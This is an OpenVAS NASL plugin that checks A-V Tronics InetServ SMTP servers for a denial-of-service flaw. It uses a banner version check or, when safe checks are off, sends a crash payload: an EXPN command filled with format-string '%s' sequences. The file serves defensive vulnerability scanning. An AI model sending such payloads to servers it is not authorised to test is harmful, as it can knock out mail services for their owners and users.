###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_a_v_tronics_inetserv_45960.nasl 13 2013-10-27 12:16:33Z jan $
#
# A-V Tronics InetServ SMTP Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "InetServ is prone to a denial-of-service vulnerability.

Exploiting this issue may allow attackers to cause the application to
crash, resulting in denial-of-service conditions.

Inetserv 3.23 is vulnerable; other versions may also be affected.";

tag_solution = "Currently, we are not aware of any vendor-supplied patches. If you
feel we are in error or are aware of more recent information, please
mail us at: vuldb@securityfocus.com.";

if (description)
{
 script_id(103040);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-24 13:11:38 +0100 (Mon, 24 Jan 2011)");
 script_bugtraq_id(45960);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("A-V Tronics InetServ SMTP Denial of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45960");
 script_xref(name : "URL" , value : "http://www.avtronics.net/inetserv.php");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if InetServ is prone to a denial-of-service vulnerability");
 script_category(ACT_MIXED_ATTACK);
 script_family("SMTP problems");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("smtpserver_detect.nasl");
 script_require_ports("Services/smtp", 25);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port) port = 25;
if(get_kb_item('SMTP/'+port+'/broken'))exit(0);
if(!get_port_state(port))exit(0);

banner = get_smtp_banner(port:port);
if(!banner || "InetServer" >!< banner)exit(0);

if(safe_checks()) {

  include("version_func.inc");

  version = eregmatch(pattern:"InetServer \(([0-9.]+)\)", string: banner);

  if(!isnull(version[1])) {
    if(version_is_equal(version:version[1],test_version:"3.2.3")) {
      security_hole(port:port);
      exit(0);
    }  
  }  

  exit(0);

} else {

  soc = smtp_open(port: port, helo: TRUE);
  if(!soc)exit(0);

  ex = "EXPN " + crap(data:string("%s"),length:80) + string("\r\n");  
  send(socket: soc, data: ex);
  send(socket:soc,data:string("help\r\n"));
  smtp_close(socket: soc);

  if(!soc1 = smtp_open(port: port, helo: FALSE)) {

     security_hole(port:port);
     exit(0);
  }
}

smtp_close(socket: soc1);
exit(0);

  
